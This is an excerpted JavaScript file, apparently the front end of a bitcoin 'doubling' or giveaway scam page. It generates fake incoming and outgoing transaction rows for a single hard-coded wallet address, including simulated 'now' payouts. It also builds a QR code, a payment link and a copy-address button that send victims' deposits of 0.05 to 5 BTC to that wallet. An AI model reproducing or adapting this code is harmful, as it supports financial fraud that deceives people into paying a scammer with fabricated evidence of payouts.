...
function create_transaction(mins) {
  ...
  row.innerHTML =
    ...
    address +
    '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bc1qgug9zhj8jkhkj5r6tc5shzsfpsxnhwts9shl6u</span> </td> <td>' +
    amount +
  ...
  row.innerHTML =
    ...
    '</a></td> <td><span class="timer">' +
    mins +
    ' mins ago</span></td> <td><span class="hash-tag text-truncate">bc1qgug9zhj8jkhkj5r6tc5shzsfpsxnhwts9shl6u</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
    address +
    '</a> </td> <td>' +
    send_amount +
    ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
  ...
  ;(row.innerHTML =
    ...
    setTimeout(() => {
      ...
      ;(row.innerHTML =
        ...
        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
        tx(99999999) +
        '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">bc1qgug9zhj8jkhkj5r6tc5shzsfpsxnhwts9shl6u</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
        address +
        '</a> </td> <td>' +
        send_amount +
        ' BTC</td> <td><span class="small text-secondary">0<b>.</b>000' +
...
;(get_random = function (
  ...
  $('#gen-btn').click(() => {
    if ($('#cal-in').val() >= 0.05 && $('#cal-in').val() <= 5) {
      ...
      $('#qrcode_svg').attr(
        'src',
        'https://chart.googleapis.com/chart?cht=qr&chl=bitcoin%3Abc1qgug9zhj8jkhkj5r6tc5shzsfpsxnhwts9shl6u%3Famount%3D&chs=180x180&choe=UTF-8&chld=L|2' +
          amount_entered +
      ...
      $('#paynow')
        ...
        .attr(
          'href',
          'bitcoin:bc1qgug9zhj8jkhkj5r6tc5shzsfpsxnhwts9shl6u?amount=' +
            amount_entered +
...
$('#copy_address').click(() => {
  $('#copy_address').attr(
    'data-clipboard-text',
    'bc1qgug9zhj8jkhkj5r6tc5shzsfpsxnhwts9shl6u',
  )
